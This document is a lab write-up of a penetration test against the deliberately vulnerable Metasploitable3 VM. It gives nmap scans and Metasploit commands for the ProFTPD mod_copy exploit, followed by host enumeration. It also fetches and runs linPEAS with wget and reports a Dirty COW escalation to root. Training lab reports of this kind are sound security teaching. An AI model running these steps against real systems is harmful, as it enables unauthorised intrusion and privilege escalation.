# üß™ Metasploitable3 Penetration Test ‚Äì Full Lab Report

## üìò Introduction

This lab simulates a real-world penetration test against the vulnerable VM Metasploitable3 using Kali Linux as the attacking machine. The goal of this lab is to highlight the vulnerabilities of an outdated system and emphasize the importance of keeping machines patched. Through a series of steps including reconnaissance, exploitation, and privilege escalation, we demonstrate how attackers can compromise unpatched systems ‚Äî documenting each phase with detailed screenshots.

## üõ†Ô∏è Lab Setup

| Machine       | OS                    | IP Address       |
|---------------|------------------------|------------------|
| Attacker      | Kali Linux             | 172.28.128.100   |
| Target        | Metasploitable3 Ubuntu | 172.28.128.3     |

## 1Ô∏è‚É£ Scanning the Network

We use `nmap` on Kali Linux to detect live hosts in our subnet.

```bash
nmap -sn 172.28.128.0/24
```

## 2Ô∏è‚É£ Scanning the Target Machine

After discovering a potential victim, We perform a detailed scan to identify open ports and services.

```bash
nmap -sS -sV -sC -O -Pn 172.28.128.3
```

## 3Ô∏è‚É£ Opening Metasploit

We noticed, among all the results, a FTP vulnerability. We launch the Metasploit Framework:

```bash
msfconsole
```

---

## 4Ô∏è‚É£ Discovering Vulnerabilities

We search for vulnerabilities in the ProFTPD service identified earlier.

```bash
search proftpd
```

---

## 5Ô∏è‚É£ Selecting Exploit and Setting Parameters

We choose `exploit/unix/ftp/proftpd_modcopy_exec` and configure it.

```bash
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 172.28.128.3
set LHOST 172.28.128.100
set RPORT 80
```

---

## 6Ô∏è‚É£ Running the Exploit

We launch the exploit to gain remote code execution.

```bash
run
```

---

## 7Ô∏è‚É£ Gathering Information

We enumerate the compromised machine.

```bash
whoami
id
hostname
uname -a
```

![Gathering System Info](screenshots/7.Gathering_Information.png)

---

## 8Ô∏è‚É£ Downloading and Executing linPEAS

We upload and execute linPEAS for local enumeration.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![Running linPEAS](screenshots/8.Downloading_And_Starting_LinPEAS.png)

---

## 9Ô∏è‚É£ Privilege Escalation Opportunities

We identify Dirty COW as a potential escalation path.

![linPEAS Output](screenshots/9.Looking_At_Machine_Vulnerabilities_For_Privileges_Escalation.png)

---

## üîü Attempted Privilege Escalation

We attempt to exploit Dirty COW, and after running the script we could finally gain root privileges.

---

With full system control achieved, the attacker now has unlimited potential to manipulate, exfiltrate, or disrupt any aspect of the machine.


## ‚úÖ Conclusion

- ‚úîÔ∏è Target identified and scanned
- ‚úîÔ∏è Exploit executed successfully using Metasploit
- ‚úîÔ∏è Post-exploitation enumeration completed
- ‚úîÔ∏è Privilege escalation attempted using Dirty COW
- ‚úîÔ∏è Root access achieved
